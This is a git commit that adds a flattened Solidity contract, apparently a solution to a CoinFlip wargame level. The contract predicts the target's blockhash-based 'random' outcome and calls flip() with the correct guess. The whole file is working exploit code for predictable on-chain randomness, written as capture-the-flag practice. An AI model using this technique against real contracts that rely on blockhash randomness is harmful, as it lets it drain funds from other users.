bdf6e7d5c4c1cbbbaabf1c9e999025417290bdd8
Joe Jordan <dev@ignitesoft.com>
2022-08-16 14:59:45 -0400

    add flattened contract
    forge flatten src/CoinFlip/CoinFlipAttack.sol --output src/CoinFlip/flattened/CoinFlipAttack.flattened.sol

---
+++ src/CoinFlip/flattened/CoinFlipAttack.flattened.sol
@@ -0,0 +1,34 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity >=0.8.4;
+
+// import { console } from "forge-std/console.sol";
+
+
+
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract CoinFlipAttack {
+    function callCoinFlip(address coinFlipInstance) public returns (bool) {
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+        // determine what the next correct coinFlip value will be
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        /* EASY WAY */
+        // bool success = ICoinFlip(coinFlipInstance).flip(side);
+
+        /* HARDER WAY */
+        // get function selector
+        bytes4 flipSelector = ICoinFlip.flip.selector;
+        // call coinFlip function on target contract
+        (bool success, ) = coinFlipInstance.call(abi.encodeWithSelector(flipSelector, side));
+
+        return success;
+
+    }
+}
